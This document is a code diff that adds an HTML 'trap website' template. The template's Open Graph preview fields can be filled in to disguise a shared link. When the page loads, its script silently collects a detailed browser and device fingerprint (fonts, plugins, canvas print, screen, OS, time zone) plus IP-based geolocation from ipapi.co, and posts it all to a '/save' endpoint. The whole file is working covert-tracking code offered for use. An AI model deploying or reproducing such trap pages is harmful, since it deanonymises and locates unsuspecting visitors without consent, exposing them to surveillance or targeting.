@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Set Payload</title>
+    <meta charset="utf-8">
+    <meta property="og:title" content="{{ title }}">
+    <meta property="og:url" content="{{ url }}">
+    <meta property="og:image" content="{{ image }}">
+    <meta property="og:description" content="{{ description }}">
+    <script
+        src="https://cdnjs.cloudflare.com/ajax/libs/ClientJS/0.2.1/client.min.js"
+        crossorigin="anonymous"
+        referrerpolicy="no-referrer">
+    </script>
+</head>
+<body>
+    This is just a trap website !
+</body>
+<script type="text/javascript">
+    let client = new ClientJS();
+    const client_payload = {
+        "getBrowserData": JSON.stringify(client.getBrowserData(), null, 4),
+        "getFingerprint": client.getFingerprint(),
+        "getUserAgent": client.getUserAgent(),
+        "getUserAgentLowerCase": client.getUserAgentLowerCase(),
+        "getBrowser": client.getBrowser(),
+        "getBrowserVersion": client.getBrowserVersion(),
+        "getBrowserMajorVersion": client.getBrowserMajorVersion(),
+        "isIE": client.isIE(),
+        "isChrome": client.isChrome(),
+        "isFirefox": client.isFirefox(),
+        "isSafari": client.isSafari(),
+        "isOpera": client.isOpera(),
+        "getEngine": client.getEngine(),
+        "getEngineVersion": client.getEngineVersion(),
+        "getOS": client.getOS(),
+        "getOSVersion": client.getOSVersion(),
+        "isWindows": client.isWindows(),
+        "isMac": client.isMac(),
+        "isLinux": client.isLinux(),
+        "isUbuntu": client.isUbuntu(),
+        "isSolaris": client.isSolaris(),
+        "getDevice": client.getDevice(),
+        "getDeviceType": client.getDeviceType(),
+        "getDeviceVendor": client.getDeviceVendor(),
+        "getCPU": client.getCPU(),
+        "isMobile": client.isMobile(),
+        "isMobileMajor": client.isMobileMajor(),
+        "isMobileAndroid": client.isMobileAndroid(),
+        "isMobileOpera": client.isMobileOpera(),
+        "isMobileWindows": client.isMobileWindows(),
+        "isMobileBlackBerry": client.isMobileBlackBerry(),
+        "isMobileIOS": client.isMobileIOS(),
+        "isIphone": client.isIphone(),
+        "isIpad": client.isIpad(),
+        "isIpod": client.isIpod(),
+        "getScreenPrint": client.getScreenPrint(),
+        "getColorDepth": client.getColorDepth(),
+        "getCurrentResolution": client.getCurrentResolution(),
+        "getAvailableResolution": client.getAvailableResolution(),
+        "getDeviceXDPI": client.getDeviceXDPI(),
+        "getDeviceYDPI": client.getDeviceYDPI(),
+        "getPlugins": client.getPlugins(),
+        "isJava": client.isJava(),
+        "getJavaVersion": client.getJavaVersion(),
+        "isFlash": client.isFlash(),
+        "getFlashVersion": client.getFlashVersion(),
+        "isSilverlight": client.isSilverlight(),
+        "getSilverlightVersion": client.getSilverlightVersion(),
+        "getMimeTypes": client.getMimeTypes(),
+        "isMimeTypes": client.isMimeTypes(),
+        "isFont": client.isFont(),
+        "getFonts": client.getFonts(),
+        "isLocalStorage": client.isLocalStorage(),
+        "isSessionStorage": client.isSessionStorage(),
+        "isCookie": client.isCookie(),
+        "getTimeZone": client.getTimeZone(),
+        "getLanguage": client.getLanguage(),
+        "getSystemLanguage": client.getSystemLanguage(),
+        "isCanvas": client.isCanvas(),
+        "getCanvasPrint": client.getCanvasPrint()
+    }
+    let latLong = {}
+
+    const send_payload = () => {
+        // get and send lat/long user   
+        fetch("https://ipapi.co/json")
+        .then(r =>  r.json().then(data => ({status: r.status, body: data})))
+        .then(latLong => {
+            const finalPayload = {...client_payload, ...latLong}
+
+            console.log(finalPayload)
+
+            fetch('/save', {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(finalPayload)
+            })
+            .then(res => res.json())
+            .then(res => {
+                console.log(res)
+            });
+        });
+    }
+    send_payload()
+    
+</script>
+</html>
